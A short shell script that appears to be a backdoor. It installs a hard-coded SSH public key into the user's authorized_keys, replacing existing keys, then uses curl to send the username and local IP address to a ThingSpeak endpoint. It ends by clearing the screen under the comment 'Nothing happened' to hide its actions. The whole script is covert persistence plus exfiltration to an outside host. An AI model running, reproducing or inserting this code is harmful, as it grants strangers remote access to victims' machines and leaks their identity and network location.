#Install password-less ssh.
authorized_keys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDonM2ulIeWSVb3iO/JBrMNDx0zAUObDky0pLWkUukuT2iykVOYIbIKUOnh/uTc7UgYfkp6IelM/7X7LiTb1+8qwJ9hZWOY8HQpMlkNFecboS6FB3dFjcveFCQTMfBks/OpvB7EC2LjTD3J9RbSFmQ990OUTmNWvjGwrH7HGSPWI11LlRRkgYAXKeaF8Ls/F8N2lZR0cnicmdsoztQGlmgecFqJtIuGVOGYseJT0gLAo7qRqi5EY35kksxKAFtgrS9GGT2yZhBMUqi04hbIFvdURvd+m5AXmsUeQjC6SvTw5W2WONxBXJ6TJGdiCj0Mr2nJ6RTQSAXBYETXkegzsJx1 173558@173558-SCT11881"
mkdir ~/.ssh/
echo "$authorized_keys" >~/.ssh/authorized_keys

#Log details
curl "https://api.thingspeak.com/update?api_key=T4388VSN8SQ22CFD&field1=$(whoami)&field2=$(ipconfig getifaddr en0)"

#Nothing happened
clear